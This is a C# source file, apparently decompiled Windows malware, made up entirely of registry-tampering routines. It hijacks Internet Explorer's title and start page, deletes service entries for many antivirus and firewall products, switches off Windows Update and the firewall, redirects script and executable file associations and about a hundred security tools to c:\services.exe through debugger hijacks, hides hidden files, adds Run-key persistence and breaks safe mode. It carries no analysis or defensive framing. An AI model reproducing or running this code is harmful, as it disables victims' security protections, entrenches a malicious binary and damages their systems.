using Microsoft.Win32;

namespace redice;

internal class ExecRegedit
{
	public void changeIEtitle()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("software\\microsoft\\Internet Explorer\\main", writable: true);
			registryKey.SetValue("Window Title", "抗日,是全中国人民义不容辞的责任！", RegistryValueKind.String);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("software\\microsoft\\Internet Explorer\\main", writable: true);
			registryKey2.SetValue("Window Title", "抗日,是全中国人民义不容辞的责任！", RegistryValueKind.String);
			registryKey2.Close();
		}
		catch
		{
		}
	}

	public void setIEStarPage()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\Internet Explorer\\main", writable: true);
			registryKey.SetValue("start page", "http://hi.baidu.com/zhongguokangri", RegistryValueKind.String);
			registryKey.SetValue("local page", "http://hi.baidu.com/zhongguokangri", RegistryValueKind.String);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("software\\microsoft\\Internet Explorer\\main", writable: true);
			registryKey2.SetValue("start page", "http://hi.baidu.com/zhongguokangri", RegistryValueKind.String);
			registryKey2.SetValue("local page", "http://hi.baidu.com/zhongguokangri", RegistryValueKind.String);
			registryKey2.Close();
		}
		catch
		{
		}
	}

	public void killSafeServer()
	{
		execKillSafeServer("navapsvc");
		execKillSafeServer("wscsvc");
		execKillSafeServer("KPfwSvc");
		execKillSafeServer("SNDSrvc");
		execKillSafeServer("ccProxy");
		execKillSafeServer("ccEvtMgr");
		execKillSafeServer("ccSetMgr");
		execKillSafeServer("SPBBCSvc");
		execKillSafeServer("Symantec Core LC");
		execKillSafeServer("NPFMntor");
		execKillSafeServer("MskService");
		execKillSafeServer("MskService");
		execKillSafeServer("FireSvc");
		execKillSafeServer("avp");
	}

	private void execKillSafeServer(string serverName)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services", writable: true);
		try
		{
			registryKey.DeleteSubKeyTree(serverName);
			registryKey.Close();
		}
		catch
		{
		}
	}

	public void delOtherVirusReg()
	{
		delOtherVirusRegMeans("{DE35052A-9E37-4827-A1EC-79BF400D27A4}");
		delOtherVirusRegMeans("{AEB6717E-7E19-11d0-97EE-00C04FD91972}");
		delOtherVirusRegMeans("{DD7D4640-4464-48C0-82FD-21338366D2D2}");
		delOtherVirusRegMeans("{B8A170A8-7AD3-4678-B2FE-F2D7381CC1B5}");
		delOtherVirusRegMeans("{131AB311-16F1-F13B-1E43-11A24B51AFD1}");
		delOtherVirusRegMeans("{274B93C2-A6DF-485F-8576-AB0653134A76}");
		delOtherVirusRegMeans("{1496D5ED-7A09-46D0-8C92-B8E71A4304DF}");
		delOtherVirusRegMeans("{0CB68AD9-FF66-3E63-636B-B693E62F6236}");
		delOtherVirusRegMeans("{09B68AD9-FF66-3E63-636B-B693E62F6236}");
		delOtherVirusRegMeans("{754FB7D8-B8FE-4810-B363-A788CD060F1F}");
		delOtherVirusRegMeans("{A6011F8F-A7F8-49AA-9ADA-49127D43138F}");
		delOtherVirusRegMeans("{06A68AD9-FF56-6E73-937B-B893E72F6226}");
		delOtherVirusRegMeans("{01F6EB6F-AB5C-1FDD-6E5B-FB6EE3CC6CD6}");
		delOtherVirusRegMeans("{06E6B6B6-BE3C-6E23-6C8E-B833E2CE63B8}");
		delOtherVirusRegMeans("{BC0ACA58-6A6F-51DA-9EFE-9D20F4F621BA}");
		delOtherVirusRegMeans("{AEB6717E-7E19-11d0-97EE-00C04FD91972}");
		delOtherVirusRegMeans("{99F1D023-7CEB-4586-80F7-BB1A98DB7602}");
		delOtherVirusRegMeans("{FEB94F5A-69F3-4645-8C2B-9E71D270AF2E}");
		delOtherVirusRegMeans("{923509F1-45CB-4EC0-BDE0-1DED35B8FD60}");
		delOtherVirusRegMeans("{42A612A4-4334-4424-4234-42261A31A236}");
	}

	private void delOtherVirusRegMeans(string virusRegValue)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks", writable: true);
		try
		{
			registryKey.DeleteSubKey(virusRegValue, throwOnMissingSubKey: true);
			registryKey.Close();
		}
		catch
		{
		}
	}

	public void closeAutoUpdateAndSafeMiddle()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services", writable: true);
		try
		{
			registryKey.DeleteSubKey("SharedAccess", throwOnMissingSubKey: true);
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			registryKey.DeleteSubKey("wuauserv", throwOnMissingSubKey: true);
			registryKey.Close();
		}
		catch
		{
		}
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\update", writable: true);
		try
		{
			registryKey2.SetValue("UpdateMode", 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	public void recomposeFileRelating()
	{
		try
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey("batfile\\shell\\open\\command", writable: true);
			registryKey.SetValue(null, "c:\\services.exe '%1'");
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey2 = Registry.ClassesRoot.OpenSubKey("cmdfile\\shell\\open\\command", writable: true);
			registryKey2.SetValue(null, "c:\\services.exe '%1'");
			registryKey2.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey3 = Registry.ClassesRoot.OpenSubKey("comfile\\shell\\open\\command", writable: true);
			registryKey3.SetValue(null, "c:\\services.exe '%1'");
			registryKey3.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey4 = Registry.ClassesRoot.OpenSubKey("regfile\\shell\\open\\command", writable: true);
			registryKey4.SetValue(null, "c:\\services.exe '%1'");
			registryKey4.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey5 = Registry.ClassesRoot.OpenSubKey("scrfile\\shell\\open\\command", writable: true);
			registryKey5.SetValue(null, "c:\\services.exe '%1'");
			registryKey5.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey6 = Registry.ClassesRoot.OpenSubKey("isofile\\shell\\open\\command", writable: true);
			registryKey6.SetValue(null, "c:\\services.exe '%1'");
			registryKey6.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey7 = Registry.ClassesRoot.OpenSubKey("piffile\\shell\\open\\command", writable: true);
			registryKey7.SetValue(null, "c:\\services.exe '%1'");
			registryKey7.Close();
		}
		catch
		{
		}
	}

	public void fileImageHijack()
	{
		addFileImageHijack("360rpt.exe");
		addFileImageHijack("360Safe.exe");
		addFileImageHijack("360tray.exe");
		addFileImageHijack("adam.exe");
		addFileImageHijack("AgentSvr.exe");
		addFileImageHijack("AppSvc32.exe");
		addFileImageHijack("AST.exe");
		addFileImageHijack("autoruns.exe");
		addFileImageHijack("avgrssvc.exe");
		addFileImageHijack("AvMonitor.exe");
		addFileImageHijack("avp.com");
		addFileImageHijack("avp.exe");
		addFileImageHijack("CCenter.exe");
		addFileImageHijack("ccSvcHst.exe");
		addFileImageHijack("FileDsty.exe");
		addFileImageHijack("FTCleanerShell.exe");
		addFileImageHijack("HijackThis.exe");
		addFileImageHijack("IceSword.exe");
		addFileImageHijack("iparmo.exe");
		addFileImageHijack("Iparmor.exe");
		addFileImageHijack("isPwdSvc.exe");
		addFileImageHijack("kabaload.exe");
		addFileImageHijack("KaScrScn.SCR");
		addFileImageHijack("KASMain.exe");
		addFileImageHijack("KASTask.exe");
		addFileImageHijack("KAV32.exe");
		addFileImageHijack("KAVDX.exe");
		addFileImageHijack("KAVPFW.exe");
		addFileImageHijack("KAVSetup.exe");
		addFileImageHijack("KAVStart.exe");
		addFileImageHijack("KISLnchr.exe");
		addFileImageHijack("KMailMon.exe");
		addFileImageHijack("KMFilter.exe");
		addFileImageHijack("KPFW32.exe");
		addFileImageHijack("KPFW32X.exe");
		addFileImageHijack("KPFWSvc.exe");
		addFileImageHijack("KRegEx.exe");
		addFileImageHijack("krepair.COM");
		addFileImageHijack("KsLoader.exe");
		addFileImageHijack("KVCenter.kxp");
		addFileImageHijack("KvDetect.exe");
		addFileImageHijack("KvfwMcl.exe");
		addFileImageHijack("KVMonXP.kxp");
		addFileImageHijack("KVMonXP_1.kxp");
		addFileImageHijack("kvol.exe");
		addFileImageHijack("kvolself.exe");
		addFileImageHijack("KvReport.kxp");
		addFileImageHijack("KVScan.kxp");
		addFileImageHijack("KVSrvXP.exe");
		addFileImageHijack("KVStub.kxp");
		addFileImageHijack("kvupload.exe");
		addFileImageHijack("kvwsc.exe");
		addFileImageHijack("KvXP.kxp");
		addFileImageHijack("KvXP_1.kxp");
		addFileImageHijack("KWatch.exe");
		addFileImageHijack("KWatch9x.exe");
		addFileImageHijack("KWatchX.exe");
		addFileImageHijack("loaddll.exe");
		addFileImageHijack("MagicSet.exe");
		addFileImageHijack("mcconsol.exe");
		addFileImageHijack("mmqczj.exe");
		addFileImageHijack("mmsk.exe");
		addFileImageHijack("NAVSetup.exe");
		addFileImageHijack("nod32krn.exe");
		addFileImageHijack("nod32kui.exe");
		addFileImageHijack("PFW.exe");
		addFileImageHijack("PFWLiveUpdate.exe");
		addFileImageHijack("QHSET.exe");
		addFileImageHijack("Ras.exe");
		addFileImageHijack("Rav.exe");
		addFileImageHijack("RavMon.exe");
		addFileImageHijack("RavMonD.exe");
		addFileImageHijack("RavStub.exe");
		addFileImageHijack("RavTask.exe");
		addFileImageHijack("RegClean.exe");
		addFileImageHijack("rfwcfg.exe");
		addFileImageHijack("RfwMain.exe");
		addFileImageHijack("rfwProxy.exe");
		addFileImageHijack("rfwsrv.exe");
		addFileImageHijack("RsAgent.exe");
		addFileImageHijack("Rsaupd.exe");
		addFileImageHijack("runiep.exe");
		addFileImageHijack("safelive.exe");
		addFileImageHijack("scan32.exe");
		addFileImageHijack("shcfg32.exe");
		addFileImageHijack("SmartUp.exe");
		addFileImageHijack("SREng.exe");
		addFileImageHijack("symlcsvc.exe");
		addFileImageHijack("SysSafe.exe");
		addFileImageHijack("TrojanDetector.exe");
		addFileImageHijack("Trojanwall.exe");
		addFileImageHijack("TrojDie.kxp");
		addFileImageHijack("UIHost.exe");
		addFileImageHijack("UmxAgent.exe");
		addFileImageHijack("UmxAttachment.exe");
		addFileImageHijack("UmxCfg.exe");
		addFileImageHijack("UmxFwHlp.exe");
		addFileImageHijack("UmxPol.exe");
		addFileImageHijack("UpLive.EXE.exe");
		addFileImageHijack("WoptiClean.exe");
		addFileImageHijack("zxsweep.exe");
	}

	private void addFileImageHijack(string safeSoftName)
	{
		try
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
			string value = "c:\\services.exe";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text, writable: true);
			registryKey.CreateSubKey(safeSoftName);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(text + "\\" + safeSoftName, writable: true);
			registryKey2.SetValue("Debugger", value, RegistryValueKind.String);
			registryKey2.Close();
		}
		catch
		{
		}
	}

	public void delRegeditHideFile()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", writable: true);
			try
			{
				registryKey.DeleteValue("CheckedValue", throwOnMissingValue: true);
			}
			catch
			{
			}
			try
			{
				registryKey.SetValue("CheckedValue", 0, RegistryValueKind.String);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void uodateRegeditAutoRun()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
			registryKey.SetValue("WinSystem", "c:\\services.exe", RegistryValueKind.String);
			registryKey.Close();
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
			registryKey2.SetValue("WinSystem", "c:\\services.exe", RegistryValueKind.String);
			registryKey2.Close();
		}
		catch
		{
		}
	}

	public void destroySafeMode()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\SafeBoot\\Minimal", writable: true);
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\SafeBoot\\Network", writable: true);
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal", writable: true);
			RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network", writable: true);
			try
			{
				registryKey.DeleteSubKey("{4D36E967-E325-11CE-BFC1-08002BE10318}", throwOnMissingSubKey: true);
			}
			catch
			{
			}
			try
			{
				registryKey2.DeleteSubKey("{4D36E967-E325-11CE-BFC1-08002BE10318}", throwOnMissingSubKey: true);
			}
			catch
			{
			}
			try
			{
				registryKey3.DeleteSubKey("{4D36E967-E325-11CE-BFC1-08002BE10318}", throwOnMissingSubKey: true);
			}
			catch
			{
			}
			try
			{
				registryKey4.DeleteSubKey("{4D36E967-E325-11CE-BFC1-08002BE10318}", throwOnMissingSubKey: true);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}
}
